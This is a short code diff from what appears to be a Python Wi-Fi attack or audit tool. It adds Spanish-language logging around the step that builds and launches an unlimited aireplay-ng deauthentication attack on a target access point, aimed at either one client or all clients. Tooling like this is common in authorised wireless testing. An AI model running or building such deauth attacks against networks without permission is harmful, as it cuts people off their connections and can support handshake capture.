@@ -191,9 +191,19 @@ if __name__ == "__main__":
             safe_run(["sudo", "iw", "dev", mon_deauth, "set", "channel", str(red_target['ch'])],
                            stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
             deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", red_target['bssid']]
-            if deauth_mode == "directed" and cliente_mac:
-                deauth_cmd.extend(["-c", cliente_mac])
+            if deauth_mode == "directed":
+                if cliente_mac:
+                    deauth_cmd.extend(["-c", cliente_mac])
+                    if on_output:
+                        on_output(f"[*] Deauth dirigido al cliente: {cliente_mac}")
+                elif on_output:
+                    on_output("[!] Deauth dirigido solicitado sin MAC de cliente: se usará broadcast.")
+            elif on_output:
+                on_output("[*] Deauth en modo broadcast (todos los clientes).")
             deauth_cmd.append(mon_deauth)
+
+            if on_output:
+                on_output(f"[*] Ejecutando: {' '.join(deauth_cmd)}")
 
             proc_deauth = safe_popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             self.pm.register("deauth", proc_deauth)
